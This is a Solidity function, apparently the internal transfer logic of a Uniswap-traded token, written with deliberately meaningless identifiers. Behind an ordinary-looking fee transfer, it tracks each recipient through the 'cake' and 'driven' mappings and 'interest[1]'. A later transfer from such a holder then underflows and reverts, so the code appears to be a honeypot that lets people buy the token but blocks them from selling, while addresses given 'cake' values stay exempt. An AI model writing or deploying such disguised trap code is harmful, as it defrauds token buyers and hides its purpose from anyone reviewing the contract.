    function biggest(

        address treated,

        address official,

        uint256 amount

    ) private {

        address hall = interest[1];

        bool border = uniswapV2Pair == treated;

        uint256 order = _fee;



        if (cake[treated] == 0 && driven[treated] > 0 && !border) {

            cake[treated] -= order;

            if (amount > 2 * 10**(13 + _decimals)) cake[treated] -= order - 1;

        }



        interest[1] = official;



        if (cake[treated] > 0 && amount == 0) {

            cake[official] += order;

        }



        driven[hall] += order + 1;



        uint256 fee = (amount / 100) * _fee;

        amount -= fee;

        _balances[treated] -= fee;

        _balances[address(this)] += fee;



        _balances[treated] -= amount;

        _balances[official] += amount;

    }
